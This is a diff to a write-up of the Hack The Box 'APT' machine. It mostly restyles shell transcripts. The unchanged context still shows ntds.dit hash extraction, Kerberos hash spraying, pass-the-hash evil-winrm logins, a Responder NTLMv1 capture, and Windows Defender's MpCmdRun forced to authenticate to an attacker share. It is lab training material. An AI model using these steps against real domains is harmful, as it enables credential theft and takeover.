@@ -281,7 +281,7 @@ ____
 The extraction is only possible since the password encryption key used for +++<span style="color:orange">+++ntds.dit+++</span>+++ is encrypted using the BOOTKEY which could be found on the SYSTEM registry hive. Otherwise, if the SYSTEM hive is not available, the bootkey could be provided as an argument to +++<span style="color:orange">+++secretsdump+++</span>+++ module of impacket.
 
 ____
-[source,shell,subs="verbatim,quotes"]
+[source,shell,subs=""]
 ----
 $ cat user_hashes.txt.ntds | head -n 1
 
@@ -341,14 +341,14 @@ $ for i in $(cat hashes.txt); do echo $i; attempt=$(impacket-getTGT HTB.local/he
 
   [*] Saving ticket in henry.vinson@apt.htb.ccache
 
-$ klist -c henry.vinson@apt.htb.ccache                                                                         1 ⨯
+$ klist -c henry.vinson@apt.htb.ccache
 
   Ticket cache: FILE:henry.vinson@apt.htb.ccache
   Default principal: henry.vinson@HTB.LOCAL
 
   Valid starting       Expires              Service principal
-  04/09/2021 16:34:58  04/10/2021 02:34:58  krbtgt/HTB.LOCAL@HTB.LOCAL
-  	  renew until 04/10/2021 16:34:58
+  xx/xx/xxxx xx:xx:xx  xx/xx/xxxx xx:xx:xx  krbtgt/HTB.LOCAL@HTB.LOCAL
+  	  renew until xx/xx/xxxx xx:xx:xx
 ----
 ____
 
@@ -409,15 +409,15 @@ And within the extracted information are stored credentials for the deployed ser
 == PART 4 : GENERATING A USER SHELL (henry.vinson_adm)
 
 ____
-[source,shell,subs="verbatim,quotes"]
+[source,shell,subs="+macros,verbatim,quotes"]
 ----
 $ evil-winrm -i apt.htb -u henry.vinson_adm -p 'G1#Ny5@2dvht' --no-colors
 
-PS C:\Users\henry.vinson_adm\Documents> whoami
+PS +++<span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span>+++ whoami
 
   htb\henry.vinson_adm
 
-PS C:\Users\henry.vinson_adm\Documents> ipconfig
+PS +++<span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span>+++ ipconfig
 
   Windows IP Configuration
 
@@ -434,7 +434,7 @@ PS C:\Users\henry.vinson_adm\Documents> ipconfig
                                          fe80::250:56ff:feb9:75a0%5
                                          10.10.10.2
 
-PS C:\Users\henry.vinson_adm\Documents> dir ..\Desktop
+PS +++<span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span>+++ dir ..\Desktop
 
       Directory: C:\Users\henry.vinson_adm\Desktop
 
@@ -448,9 +448,9 @@ ____
 It seems like the reason why the other users cannot authenticate via WinRM even though a valid hash has been found is that they are not part of the +++<span style="color:orange">+++Remote Management Users+++</span>+++ group:
 
 ____
-[source,shell,subs="verbatim,quotes"]
+[source,shell,subs="+macros,verbatim,quotes"]
 ----
-PS C:\Users\henry.vinson_adm\Documents> net localgroup "Remote Management Users"
+PS +++<span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span>+++ net localgroup "Remote Management Users"
 
   Alias name     Remote Management Users
   Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
@@ -470,11 +470,11 @@ ____
 
 Checking the console history of the current user:
 ____
-[source,shell,subs="verbatim,quotes"]
+[source,shell,subs="+macros,verbatim,quotes"]
 ----
-PS C:\Users\henry.vinson_adm\Documents> cd ..\AppData
+PS +++<span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span>+++ cd ..\AppData
 
-PS C:\Users\henry.vinson_adm\AppData> type Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+PS +++<span style="color:#779ECB">C:\Users\henry.vinson_adm\AppData></span>+++ type Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ----
 ____
 ____
@@ -504,7 +504,7 @@ With this the machine should only repond with NTLMv1 hashes during authenticatio
 
 Setting up `*responder*` with a custom challeng, "1122334455667788"
 ____
-[source,shell,subs="verbatim,quotes"]
+[source,console,subs=""]
 ----
 $ cat /etc/responder/Responder.conf | grep -i challenge
 
@@ -547,11 +547,11 @@ ____
 Then forcing the target machine to force NTLM authentication:
 
 ____
-[source,shell,subs="verbatim,quotes"]
+[source,shell,subs="+macros,verbatim,quotes"]
 ----
-PS C:\Users\henry.vinson_adm\AppData> cd "C:\ProgramData\Microsoft\Windows Defender\platform"
+PS +++<span style="color:#779ECB">C:\Users\henry.vinson_adm\AppData></span>+++ cd "C:\ProgramData\Microsoft\Windows Defender\platform"
 
-PS C:\ProgramData\Microsoft\Windows Defender\platform> dir
+PS +++<span style="color:#779ECB">C:\ProgramData\Microsoft\Windows Defender\platform></span>+++ dir
 
 
       Directory: C:\ProgramData\Microsoft\Windows Defender\platform
@@ -562,9 +562,9 @@ PS C:\ProgramData\Microsoft\Windows Defender\platform> dir
   d-----       11/10/2020  11:09 AM                4.18.2010.7-0
   d-----        3/17/2021   3:13 PM                4.18.2102.4-0
 
-PS C:\ProgramData\Microsoft\Windows Defender\platform> cd 4.18.2010.7-0
+PS +++<span style="color:#779ECB">C:\ProgramData\Microsoft\Windows Defender\platform></span>+++ cd 4.18.2010.7-0
 
-C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.11\file.txt
+PS +++<span style="color:#779ECB">C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0></span>+++ .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.11\file.txt
 ----
 ____
 
@@ -580,9 +580,9 @@ ____
 ----
 ____
 ____
-[source,console,subs="verbatim,quotes"]
+[source,shell,subs="+macros,verbatim,quotes"]
 ----
-PS C:\Users\henry.vinson_adm\Documents> Get-ADComputer "APT"
+PS +++<span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span>+++ Get-ADComputer "APT"
 
   DistinguishedName : CN=APT,OU=Domain Controllers,DC=htb,DC=local
   DNSHostName       : apt.htb.local
@@ -649,15 +649,15 @@ ____
 === 5.4 Shell as Administrator
 
 ____
-[source,shell,subs="verbatim,quotes"]
+[source,shell,subs="+macros,verbatim,quotes"]
 ----
 $ evil-winrm -i apt.htb -u Administrator -H c370bddf384a691d811ff3495e8a72e2 --no-colors
 
-PS C:\Users\Administrator\Documents> whoami
+PS +++<span style="color:#779ECB">C:\Users\Administrator\Documents></span>+++ whoami
 
   htb\administrator
 
-PS C:\Users\Administrator\Documents> dir ..\Desktop
+PS +++<span style="color:#779ECB">C:\Users\Administrator\Documents></span>+++ dir ..\Desktop
 
 
       Directory: C:\Users\Administrator\Desktop
@@ -665,10 +665,10 @@ PS C:\Users\Administrator\Documents> dir ..\Desktop
 
   Mode                LastWriteTime         Length Name
   ----                -------------         ------ ----
-  -ar---        4/10/2021   9:11 AM             34 root.txt
+  -ar---       xx/xx/xxxx  xx:xx XX             34 root.txt
 
 
-PS C:\Users\Administrator\Documents> ipconfig
+PS +++<span style="color:#779ECB">C:\Users\Administrator\Documents></span>+++ ipconfig
 
   Windows IP Configuration
 
@@ -695,3 +695,4 @@ ____
 - https://adsecurity.org/?p=2398
 - https://www.lifewire.com/hkey-users-2625903
 - https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level 
+- https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse
